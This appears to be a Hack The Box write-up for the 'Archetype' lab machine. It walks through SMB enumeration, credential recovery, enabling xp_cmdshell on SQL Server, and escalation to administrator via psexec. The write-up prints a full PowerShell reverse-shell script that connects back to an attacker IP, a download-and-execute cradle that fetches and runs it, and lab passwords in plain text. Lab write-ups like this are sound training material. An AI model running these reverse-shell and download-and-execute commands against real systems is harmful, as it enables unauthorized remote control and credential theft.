Archetype is a windows based OS which is a part of Starting point lab machine on Hackthebox.
Let's connect to the hackthebox network using openvpn.

i. Enumeration:
===============
-> Information Gathering/Enumerating is one of the first step we do while doing Penetration testing in the real world or in the lab machines.We will use Nmap
tool to enumerate the machine.

# nmap -sC -sV -p- -T4 --min-rate=1000 -vvv -oN scan <lab ip>
=> Let's break all the commands
-sC        : For default script scan
-sV        : For service detection
-T4        : Set timing level higher
--min-rate : Sends data packets at very high speed

After a while, we got our results where different ports are open but we found two interesting ports of our use.
They are:
* 445 for SMB Server[cross-platform file sharing service]
* 1443 for SQL Server[Related to database]

Now, we will try to know about the SMB server shares:

# smbclient -N -L \\<lab ip>
=> It will list all the shares of smb server
-N : flags for No-password
-L : List the hosts

*** We got an interesting share named backups, Let's have a look into it***

# smbclient -N \\\\\<lab IP>\backups
=> we got access to the backups share. write following command to know  about files and folders in smb server.
  smb> dir
  - List the directory
  smb> get prod.dtsConfig
  - Downloads the directory
  
 
 *** WELL!!!Now we got an password for ARCHETYPE\sql_svc which is M3g4c0rp123***
 
 ii. Gaining Access
 ==================

To gain access to the SQL Server, We need to install impacket from github:
Clone the impacket: #git clone https://github.com/SecureAuthCorp/impacket.git
Change directory  : cd /opt/impacket/examples
Run the mssqlclient: ./mssqlclient.py ARCHETYPE/sql_svc@<lab ip> -windows-auth
                  :  SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
                   -> It will reveal us whether the user has privilege to run the commands.
                   
                   This step might be confusing but will be easier when you get the actual concept. We will configure SQL server to run any commands we want
                   SQL> EXEC sp_configure 'Show Advanced Options',1;
                   -> It sets the advanced options to 1, so that we can change the configuration setting
                   
                   SQL>reconfigure
                   -> Save the changes
                   
                   SQL> EXEC sp_configure 'xp_cmdshell',1;
                   -> Update the xp_cmdshell to run the commands we want
                   
                   SQL> reconfigure
                   SQL> xp_cmdshell "whoami"
                   -> Now we can run any command
                  
It is a powershell script to get reverse shell back on our machine
Save the following shell.ps1 file on our attacker machine:

 $client = New-Object System.Net.Sockets.TCPClient("<attacker ip>",443);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()};
 $client.Close()
 
 Run the local server on our machine:
 # python3 -m http.server 80
 
 And at the same time run netcat listener
 # nc -lvp 443
 
Now, run the following command on SQL server:
SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString(\"http://<localserver ip>/shell.ps1\");"

When we visit our netcat lister, We got a shell.
*** Go to C:\Users\sql_svc\Desktop******
Copy the user.txt flag


iii. Privilege Escalation
=========================
-> After Getting an user shell, it's time to escalate our privilege to root. As we know this is a normal user account, thus it's worth checking the frequently
access files and commands executed on the powershell.
# type C:\Users\sql_svc\Appdata\Roaming\Microsoft\Windows\PowerShell\PsReadLIne\ConsoleHost_history.txt
-> We got an admin password MEGACORP_4dm1n!!

Let's connect to the server using administrator credentials:
#./opt/impacket/examples/psexec.py administrator@<lab ip>
-> Enter the password and we got root shell

*****Copy the flag from Desktop folder of administrator********
